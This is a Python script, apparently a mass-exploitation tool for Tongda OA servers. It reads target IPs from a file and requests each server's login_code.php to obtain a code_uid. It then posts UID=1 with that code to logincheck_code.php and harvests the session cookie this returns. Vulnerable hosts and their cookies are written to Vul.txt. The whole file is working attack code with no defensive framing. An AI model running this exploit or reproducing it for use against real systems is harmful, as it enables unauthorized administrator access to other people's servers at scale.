# -*- coding: utf-8 -*-
# Author: Yoga7xm
import mylog
import asyncio
import aiohttp
import os
import time
from aiomultiprocess import Pool

start = time.time()
proxy = "http://127.0.0.1:8080"
headers = {
    "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
    "Connection": "close"
}


logger = mylog.mylogger()

file = open("tongda.txt","r")
IPS = file.readlines()
file.close()

async def POC(ip):

    ip = ip.strip()
    cookies = {}
    # if ip.startswith("https"):
    #     url1 = f"{ip}/general/login_code.php"
    # else:
    url1 = f"http://{ip}/general/login_code.php"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url=url1,headers=headers
                    ,timeout=4,verify_ssl=False,cookies=cookies,proxy=proxy) as resp1:
                if resp1.status != 200:
                    # logger.debug("响应码为: {}",resp1.status)
                    return
                data = await resp1.read()
                if b"code_uid" not in data:
                    # logger.debug("{}响应包无uid",url1)
                    return
                data = str(data,encoding="ISO-8859-1")
                CODE_UID = data[data.rfind("{") + 1:data.rfind("}", 0, data.rfind("}") - 1)]
                # if ip.startswith("https"):
                #     url2 = f"{ip}/logincheck_code.php"
                # else:
                url2 = f"http://{ip}/logincheck_code.php"
                payload = {
                    "UID":1,
                    "CODEUID":"{"+CODE_UID+"}"
                }
                async with session.post(url=url2,data=payload,cookies=cookies,headers=headers
                        ,timeout=4,verify_ssl=False,proxy=proxy) as resp2:
                    if resp2.status != 200:
                        # logger.debug("响应码为: {}", resp2.status)
                        return
                    data = await resp2.json(encoding="gbk",content_type="text/html")
                    if data["status"] != 1:
                        logger.debug("{} msg: {}",ip,data)
                        return
                    cookie = resp2.headers["Set-Cookie"]
                    if not cookie:
                        return
                    logger.success("Success! Get Available Cookie: {}",cookie)
                    return [ip,cookie]
                    # url3 = f"http://{ip}/general/index.php"
                    # sessid = cookie.split("=")[1].split(";")[0].strip()
                    # cookiee = {
                    #     "PHPSESSID":sessid
                    # }
                    # async with session.get(url=url3,cookies=cookiee,headers=headers,
                    #                 timeout=4, verify_ssl=False, proxy=proxy) as resp3:
                    #     if resp3.status != 200:
                    #         return
                    #     return (ip,cookie)
        except Exception as e:
            # logger.error(str(e))
            pass
async def do():
    async with Pool(os.cpu_count()) as pool:
        result = await pool.map(POC,IPS)
        if result:
            return result

if __name__ == '__main__':

    tasks = asyncio.ensure_future(do())
    loop = asyncio.get_event_loop()
    loop.run_until_complete(tasks)
    Vul_ips = tasks.result()
    logger.success("Finish")
    with open("Vul.txt","w") as f:
        for ip in Vul_ips:
            if ip:
                f.write(f"{ip[0]} | {ip[1]}\n")
        logger.debug("Cost time is :{}",str(time.time()-start))